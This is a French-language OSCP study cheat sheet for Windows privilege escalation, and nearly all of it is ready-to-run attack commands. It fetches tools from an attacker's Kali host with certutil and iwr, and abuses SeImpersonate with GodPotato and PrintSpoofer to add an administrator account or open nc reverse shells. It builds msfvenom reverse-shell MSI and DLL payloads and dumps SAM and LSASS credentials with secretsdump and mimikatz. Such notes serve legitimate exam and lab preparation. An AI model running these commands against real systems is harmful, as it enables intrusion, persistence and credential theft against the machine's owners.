# 02 — Windows Privesc

## 1. Énumération automatique

```bash
# WinPEAS
.\winPEASx64.exe
.\winPEASx86.exe                                   # si système 32 bits

# Depuis Kali — transfert rapide
python3 -m http.server 80
# Sur la cible :
certutil -urlcache -split -f http://<KALI>/winPEASx64.exe winpeas.exe
iwr -uri http://<KALI>/winPEASx64.exe -outfile winpeas.exe
```

---

## 2. Vérifications manuelles prioritaires

```powershell
# Qui suis-je ?
whoami
whoami /all                                        # privs + groupes — CRITIQUE
whoami /priv
whoami /groups

# Infos système
systeminfo
hostname

# Utilisateurs
net user
net user <username>
net localgroup administrators

# Réseau
ipconfig /all
netstat -ano
route print

# Services
sc query
sc qc <service>                                    # détails d'un service
Get-Service | Where-Object {$_.Status -eq "Running"}

# Tâches planifiées
schtasks /query /fo LIST /v

# Processus
tasklist /v
Get-Process

# Fichiers intéressants
dir /s /b *pass* *cred* *secret* *config* 2>nul
findstr /si "password" *.txt *.xml *.ini *.config

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

---

## 3. Décision rapide selon whoami /priv

| Privilege | Exploitation |
|---|---|
| **SeImpersonatePrivilege** | GodPotato, PrintSpoofer, JuicyPotato |
| **SeAssignPrimaryTokenPrivilege** | GodPotato |
| **SeBackupPrivilege** | Dump SAM/NTDS.dit |
| **SeDebugPrivilege** | Dump LSASS (Mimikatz) |
| **SeTakeOwnershipPrivilege** | Prendre propriété de fichiers |
| **SeLoadDriverPrivilege** | Charger driver malveillant |

### GodPotato (SeImpersonate)
```bash
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
.\GodPotato.exe -cmd "cmd /c .\nc.exe <KALI> 4444 -e cmd"
```

### PrintSpoofer (SeImpersonate)
```bash
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "nc.exe <KALI> 4444 -e cmd"
```

---

## 4. Services mal configurés

```powershell
# Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Permissions sur les binaires de services
icacls "C:\path\to\service.exe"
# Si BUILTIN\Users:(F) ou (W) → remplacer par payload

# Permissions sur le registre des services
Get-Acl HKLM:\System\CurrentControlSet\Services\<service> | Format-List
```

---

## 5. Tâches planifiées

```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status\|command"
# Cherche tâche qui tourne en SYSTEM avec binaire modifiable
```

---

## 6. AlwaysInstallElevated

```bash
# Si les deux clés registry = 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 7. DLL Hijacking

```powershell
# Identifier DLL manquantes avec Procmon (lab) ou manuellement
# Créer DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o evil.dll
# Placer dans le répertoire du binaire vulnérable
```

---

## 8. Dump de credentials

```powershell
# SAM (nécessite SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Depuis Kali :
secretsdump.py -sam sam.bak -system system.bak LOCAL

# LSASS (SeDebugPrivilege ou SYSTEM)
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Via task manager → créer dump lsass.dmp → analyser avec mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## 9. Transfert de fichiers

```powershell
# HTTP
iwr -uri http://<KALI>/<file> -outfile <file>
certutil -urlcache -split -f http://<KALI>/<file> <file>

# SMB (depuis Kali)
impacket-smbserver share . -smb2support
# Sur la cible :
copy \\<KALI>\share\<file> .

# Base64
# Kali : base64 -w 0 file.exe
# Windows : [System.Convert]::FromBase64String("<base64>") | Set-Content -Encoding Byte file.exe
```

---

## Tags
#oscp #windows #privesc
